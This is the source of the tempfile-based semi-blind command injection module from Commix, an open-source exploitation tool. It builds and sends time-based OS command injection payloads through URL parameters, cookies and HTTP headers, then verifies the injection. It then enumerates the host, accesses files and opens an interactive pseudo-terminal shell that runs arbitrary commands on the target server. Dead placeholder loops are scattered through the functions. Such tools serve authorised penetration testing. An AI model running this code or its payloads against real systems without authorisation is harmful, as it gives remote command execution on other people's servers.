"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2023 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""
import os
import re
import sys
import time
import string
import random
import base64
from src.utils import menu
from src.utils import logs
from src.utils import settings
from src.core.compat import xrange
from src.utils import session_handler
from src.core.requests import headers
from src.core.requests import requests
from src.core.requests import parameters
from src.utils import common
from src.core.injections.controller import checks
from src.thirdparty.six.moves import input as _input
from src.thirdparty.six.moves import urllib as _urllib
from src.core.injections.controller import shell_options
from src.thirdparty.colorama import Fore, Back, Style, init
from src.core.injections.semiblind.techniques.file_based import fb_injector
from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector
from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads
from src.core.injections.semiblind.techniques.tempfile_based import tfb_enumeration
from src.core.injections.semiblind.techniques.tempfile_based import tfb_file_access
'\nThe "tempfile-based" injection technique on semiblind OS command injection.\n__Warning:__ This technique is still experimental, is not yet fully functional and may leads to false-positive results.\n'
'\nDelete previous shells outputs.\n'

def delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
    if False:
        while True:
            i = 10
    if settings.VERBOSITY_LEVEL != 0:
        debug_msg = "Deleting the generated file '" + OUTPUT_TEXTFILE + "'"
        print(settings.print_debug_msg(debug_msg))
    if settings.TARGET_OS == settings.OS.WINDOWS:
        cmd = settings.WIN_DEL + OUTPUT_TEXTFILE
    else:
        cmd = settings.DEL + OUTPUT_TEXTFILE + settings.SINGLE_WHITESPACE + settings.COMMENT
    response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
'\nThe "tempfile-based" injection technique handler\n'

def tfb_injection_handler(url, timesec, filename, tmp_path, http_request_method, url_time_response):
    if False:
        for i in range(10):
            print('nop')
    counter = 1
    num_of_chars = 1
    vp_flag = True
    no_result = True
    is_encoded = False
    possibly_vulnerable = False
    false_positive_warning = False
    export_injection_info = False
    how_long = 0
    injection_type = 'semi-blind command injection'
    technique = 'tempfile-based injection technique'
    if settings.TIME_RELATIVE_ATTACK == False:
        warn_msg = 'It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.'
        print(settings.print_warning_msg(warn_msg) + Style.RESET_ALL)
        settings.TIME_RELATIVE_ATTACK = None
    if menu.options.maxlen:
        settings.MAXLEN = maxlen = menu.options.maxlen
    if menu.options.url_reload == True:
        err_msg = "The '--url-reload' option is not available in " + technique + '!'
        print(settings.print_critical_msg(err_msg))
    if not settings.LOAD_SESSION:
        TAG = ''.join((random.choice(string.ascii_uppercase) for num_of_chars in range(6)))
    if settings.VERBOSITY_LEVEL != 0:
        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '
        print(settings.print_info_msg(info_msg))
    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)
    for whitespace in settings.WHITESPACES:
        for prefix in settings.PREFIXES:
            for suffix in settings.SUFFIXES:
                for separator in settings.SEPARATORS:
                    settings.DETECTION_PHASE = True
                    settings.EXPLOITATION_PHASE = False
                    how_long_statistic = []
                    if settings.LOAD_SESSION:
                        try:
                            settings.TEMPFILE_BASED_STATE = True
                            cmd = shell = ''
                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)
                            checks.check_for_stored_tamper(payload)
                            settings.FOUND_HOW_LONG = how_long
                            settings.FOUND_DIFF = how_long - timesec
                            OUTPUT_TEXTFILE = tmp_path + TAG + '.txt'
                        except TypeError:
                            err_msg = "An error occurred while accessing session file ('"
                            err_msg += settings.SESSION_FILE + "'). "
                            err_msg += "Use the '--flush-session' option."
                            print(settings.print_critical_msg(err_msg))
                            raise SystemExit()
                    else:
                        num_of_chars = num_of_chars + 1
                        combination = prefix + separator
                        if combination in settings.JUNK_COMBINATION:
                            prefix = ''
                        OUTPUT_TEXTFILE = tmp_path + TAG + '.txt'
                        alter_shell = menu.options.alter_shell
                        tag_length = len(TAG) + 4
                        for output_length in range(1, int(tag_length)):
                            try:
                                if alter_shell:
                                    payload = tfb_payloads.decision_alter_shell(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
                                else:
                                    payload = tfb_payloads.decision(separator, output_length, TAG, OUTPUT_TEXTFILE, timesec, http_request_method)
                                payload = parameters.prefixes(payload, prefix)
                                payload = parameters.suffixes(payload, suffix)
                                payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)
                                payload = checks.perform_payload_modification(payload)
                                if settings.VERBOSITY_LEVEL != 0:
                                    payload_msg = payload.replace('\n', '\\n')
                                    print(settings.print_payload(payload))
                                if settings.COOKIE_INJECTION == True:
                                    vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)
                                    how_long = tfb_injector.cookie_injection_test(url, vuln_parameter, payload)
                                elif settings.USER_AGENT_INJECTION == True:
                                    vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)
                                    how_long = tfb_injector.user_agent_injection_test(url, vuln_parameter, payload)
                                elif settings.REFERER_INJECTION == True:
                                    vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)
                                    how_long = tfb_injector.referer_injection_test(url, vuln_parameter, payload)
                                elif settings.HOST_INJECTION == True:
                                    vuln_parameter = parameters.specify_host_parameter(menu.options.host)
                                    how_long = tfb_injector.host_injection_test(url, vuln_parameter, payload)
                                elif settings.CUSTOM_HEADER_INJECTION == True:
                                    vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)
                                    how_long = tfb_injector.custom_header_injection_test(url, vuln_parameter, payload)
                                else:
                                    (how_long, vuln_parameter) = tfb_injector.injection_test(payload, http_request_method, url)
                                how_long_statistic.append(how_long)
                                percent = num_of_chars * 100 / total
                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))
                                if percent == 100 and no_result == True:
                                    if settings.VERBOSITY_LEVEL == 0:
                                        percent = settings.FAIL_STATUS
                                    else:
                                        percent = ''
                                elif url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):
                                    false_positive_fixation = False
                                    if len(TAG) == output_length:
                                        statistical_anomaly = True
                                        if len(set(how_long_statistic[0:5])) == 1:
                                            if max(xrange(len(how_long_statistic)), key=lambda x: how_long_statistic[x]) == len(TAG) - 1:
                                                statistical_anomaly = False
                                                how_long_statistic = []
                                        if timesec <= how_long and (not statistical_anomaly):
                                            false_positive_fixation = True
                                        else:
                                            false_positive_warning = True
                                    if false_positive_warning:
                                        message = 'Unexpected time delays have been identified due to unstable '
                                        message += 'requests. This behavior may lead to false-positive results. '
                                        sys.stdout.write('\r')
                                        while True:
                                            message = message + 'How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > '
                                            proceed_option = common.read_input(message, default='C', check_batch=True)
                                            if proceed_option.lower() in settings.CHOICE_PROCEED:
                                                if proceed_option.lower() == 's':
                                                    false_positive_fixation = False
                                                    raise
                                                elif proceed_option.lower() == 'c':
                                                    timesec = timesec + 1
                                                    false_positive_fixation = True
                                                    break
                                                elif proceed_option.lower() == 'q':
                                                    raise SystemExit()
                                            else:
                                                common.invalid_option(proceed_option)
                                                pass
                                    if settings.VERBOSITY_LEVEL == 0:
                                        percent = '.. (' + str(float_percent) + '%)'
                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''
                                        sys.stdout.write('\r' + settings.print_info_msg(info_msg))
                                        sys.stdout.flush()
                                    if false_positive_fixation:
                                        false_positive_fixation = False
                                        settings.FOUND_HOW_LONG = how_long
                                        settings.FOUND_DIFF = how_long - timesec
                                        if false_positive_warning:
                                            time.sleep(1)
                                        randv1 = random.randrange(0, 4)
                                        randv2 = random.randrange(1, 5)
                                        randvcalc = randv1 + randv2
                                        if settings.TARGET_OS == settings.OS.WINDOWS:
                                            if alter_shell:
                                                cmd = settings.WIN_PYTHON_INTERPRETER + ' -c "print (' + str(randv1) + ' + ' + str(randv2) + ')"'
                                            else:
                                                rand_num = randv1 + randv2
                                                cmd = 'powershell.exe -InputFormat none write (' + str(rand_num) + ')'
                                        else:
                                            cmd = 'echo $((' + str(randv1) + ' %2B ' + str(randv2) + '))'
                                        original_how_long = how_long
                                        (how_long, output) = tfb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, how_long, url_time_response, false_positive_warning)
                                        if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):
                                            if str(output) == str(randvcalc) and len(TAG) == output_length:
                                                possibly_vulnerable = True
                                                how_long_statistic = 0
                                                if settings.VERBOSITY_LEVEL == 0:
                                                    percent = settings.info_msg
                                                else:
                                                    percent = ''
                                        else:
                                            break
                                    else:
                                        if settings.VERBOSITY_LEVEL == 0:
                                            percent = '.. (' + str(float_percent) + '%)'
                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''
                                            sys.stdout.write('\r' + settings.print_info_msg(info_msg))
                                            sys.stdout.flush()
                                        continue
                                else:
                                    if settings.VERBOSITY_LEVEL == 0:
                                        percent = '.. (' + str(float_percent) + '%)'
                                        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''
                                        sys.stdout.write('\r' + settings.print_info_msg(info_msg))
                                        sys.stdout.flush()
                                    continue
                            except (KeyboardInterrupt, SystemExit):
                                if 'cmd' in locals():
                                    delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                                raise
                            except EOFError:
                                if settings.STDIN_PARSING:
                                    print(settings.SINGLE_WHITESPACE)
                                err_msg = 'Exiting, due to EOFError.'
                                print(settings.print_error_msg(err_msg))
                                if 'cmd' in locals():
                                    delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                                raise
                            except:
                                percent = num_of_chars * 100 / total
                                float_percent = '{0:.1f}'.format(round(num_of_chars * 100 / (total * 1.0), 2))
                                if str(float_percent) == '100.0':
                                    if no_result == True:
                                        if settings.VERBOSITY_LEVEL == 0:
                                            percent = settings.FAIL_STATUS
                                            info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''
                                            sys.stdout.write('\r' + settings.print_info_msg(info_msg))
                                            sys.stdout.flush()
                                        else:
                                            percent = ''
                                    else:
                                        percent = '.. (' + str(float_percent) + '%)'
                                        print(settings.SINGLE_WHITESPACE)
                                        logs.logs_notification(filename)
                                else:
                                    percent = '.. (' + str(float_percent) + '%)'
                            break
                    if url_time_response == 0 and how_long - timesec >= 0 or (url_time_response != 0 and how_long - timesec == 0 and (how_long == timesec)) or (url_time_response != 0 and how_long - timesec > 0 and (how_long >= timesec + 1)):
                        if len(TAG) == output_length and (possibly_vulnerable == True or (settings.LOAD_SESSION and int(is_vulnerable) == menu.options.level)):
                            found = True
                            no_result = False
                            settings.DETECTION_PHASE = False
                            settings.EXPLOITATION_PHASE = True
                            if settings.LOAD_SESSION:
                                if whitespace == '%20':
                                    whitespace = settings.SINGLE_WHITESPACE
                                possibly_vulnerable = False
                            if settings.COOKIE_INJECTION == True:
                                header_name = ' cookie'
                                found_vuln_parameter = vuln_parameter
                                the_type = ' parameter'
                            elif settings.USER_AGENT_INJECTION == True:
                                header_name = ' User-Agent'
                                found_vuln_parameter = ''
                                the_type = ' HTTP header'
                            elif settings.REFERER_INJECTION == True:
                                header_name = ' Referer'
                                found_vuln_parameter = ''
                                the_type = ' HTTP header'
                            elif settings.HOST_INJECTION == True:
                                header_name = ' Host'
                                found_vuln_parameter = ''
                                the_type = ' HTTP header'
                            elif settings.CUSTOM_HEADER_INJECTION == True:
                                header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME
                                found_vuln_parameter = ''
                                the_type = ' HTTP header'
                            else:
                                header_name = ''
                                the_type = ' parameter'
                                if not settings.USER_DEFINED_POST_DATA:
                                    found_vuln_parameter = parameters.vuln_GET_param(url)
                                else:
                                    found_vuln_parameter = vuln_parameter
                            if len(found_vuln_parameter) != 0:
                                found_vuln_parameter = " '" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + "'"
                            if export_injection_info == False:
                                export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
                            if vp_flag == True:
                                vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
                            logs.update_payload(filename, counter, payload)
                            counter = counter + 1
                            if not settings.LOAD_SESSION:
                                if settings.VERBOSITY_LEVEL == 0:
                                    print(settings.SINGLE_WHITESPACE)
                                else:
                                    checks.total_of_requests()
                            info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '
                            info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'
                            print(settings.print_bold_info_msg(info_msg))
                            sub_content = str(checks.url_decode(payload))
                            print(settings.print_sub_content(sub_content))
                            if not settings.LOAD_SESSION:
                                shell = ''
                                session_handler.injection_point_importation(url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, original_how_long, output_length, is_vulnerable=menu.options.level)
                            else:
                                whitespace = settings.WHITESPACES[0]
                                settings.LOAD_SESSION = False
                            delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                            if settings.TARGET_OS == settings.OS.WINDOWS:
                                time.sleep(1)
                            if settings.ENUMERATION_DONE == True:
                                while True:
                                    message = 'Do you want to ignore stored session and enumerate again? [y/N] > '
                                    enumerate_again = common.read_input(message, default='N', check_batch=True)
                                    if enumerate_again in settings.CHOICE_YES:
                                        if not menu.options.ignore_session:
                                            menu.options.ignore_session = True
                                        tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                                        break
                                    elif enumerate_again in settings.CHOICE_NO:
                                        break
                                    elif enumerate_again in settings.CHOICE_QUIT:
                                        delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                                        raise SystemExit()
                                    else:
                                        common.invalid_option(enumerate_again)
                                        pass
                            elif menu.enumeration_options():
                                tfb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                            if settings.FILE_ACCESS_DONE == True:
                                while True:
                                    message = 'Do you want to ignore stored session and access files again? [y/N] > '
                                    file_access_again = common.read_input(message, default='N', check_batch=True)
                                    if file_access_again in settings.CHOICE_YES:
                                        if not menu.options.ignore_session:
                                            menu.options.ignore_session = True
                                        tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                                        break
                                    elif file_access_again in settings.CHOICE_NO:
                                        break
                                    elif file_access_again in settings.CHOICE_QUIT:
                                        delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                                        raise SystemExit()
                                    else:
                                        common.invalid_option(file_access_again)
                                        pass
                            elif menu.file_access_options():
                                tfb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                            if menu.options.os_cmd:
                                cmd = menu.options.os_cmd
                                (check_how_long, output) = tfb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                                if len(output) > 1:
                                    delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                            try:
                                checks.alert()
                                go_back = False
                                go_back_again = False
                                while True:
                                    if go_back == True:
                                        break
                                    message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '
                                    if not settings.STDIN_PARSING:
                                        gotshell = common.read_input(message, default='Y', check_batch=True)
                                    else:
                                        gotshell = common.read_input(message, default='n', check_batch=True)
                                    if gotshell in settings.CHOICE_YES:
                                        print(settings.OS_SHELL_TITLE)
                                        if settings.READLINE_ERROR:
                                            checks.no_readline_module()
                                        while True:
                                            if false_positive_warning:
                                                warn_msg = 'Due to unexpected time delays, it is highly '
                                                warn_msg += "recommended to enable the 'reverse_tcp' option.\n"
                                                sys.stdout.write('\r' + settings.print_warning_msg(warn_msg))
                                                false_positive_warning = False
                                            if not settings.READLINE_ERROR:
                                                checks.tab_autocompleter()
                                            sys.stdout.write(settings.OS_SHELL)
                                            cmd = common.read_input(message='', default='os_shell', check_batch=True)
                                            cmd = checks.escaped_cmd(cmd)
                                            if cmd.lower() in settings.SHELL_OPTIONS:
                                                (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')
                                                if go_back and go_back_again == False:
                                                    break
                                                if go_back and go_back_again:
                                                    return True
                                            else:
                                                if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                                                    (check_how_long, output) = tfb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response)
                                                    tfb_injector.export_injection_results(cmd, separator, output, check_how_long)
                                                    if not menu.options.ignore_session:
                                                        session_handler.store_cmd(url, cmd, output, vuln_parameter)
                                                else:
                                                    output = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
                                                    print(settings.print_output(output))
                                                logs.executed_command(filename, cmd, output)
                                    elif gotshell in settings.CHOICE_NO:
                                        if checks.next_attack_vector(technique, go_back) == True:
                                            break
                                        elif no_result == True:
                                            return False
                                        else:
                                            delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                                            return True
                                    elif gotshell in settings.CHOICE_QUIT:
                                        delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                                        raise SystemExit()
                                    else:
                                        common.invalid_option(gotshell)
                                        pass
                            except (KeyboardInterrupt, SystemExit):
                                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                                sys.stdout.write('\r')
                                raise
                            except EOFError:
                                if settings.STDIN_PARSING:
                                    print(settings.SINGLE_WHITESPACE)
                                err_msg = 'Exiting, due to EOFError.'
                                print(settings.print_error_msg(err_msg))
                                delete_previous_shell(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
                                sys.stdout.write('\r')
                                raise
    if no_result == True:
        if settings.VERBOSITY_LEVEL == 0:
            print(settings.SINGLE_WHITESPACE)
        return False
    else:
        sys.stdout.write('\r')
        sys.stdout.flush()
'\nThe exploitation function.\n(call the injection handler)\n'

def exploitation(url, timesec, filename, tmp_path, http_request_method, url_time_response):
    if False:
        for i in range(10):
            print('nop')
    if not settings.TIME_RELATIVE_ATTACK:
        warn_msg = 'It is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions.'
        print(settings.print_warning_msg(warn_msg) + Style.RESET_ALL)
        settings.TIME_RELATIVE_ATTACK = True
    if tfb_injection_handler(url, timesec, filename, tmp_path, http_request_method, url_time_response) == False:
        settings.TIME_RELATIVE_ATTACK = False
        settings.TEMPFILE_BASED_STATE = False
        return False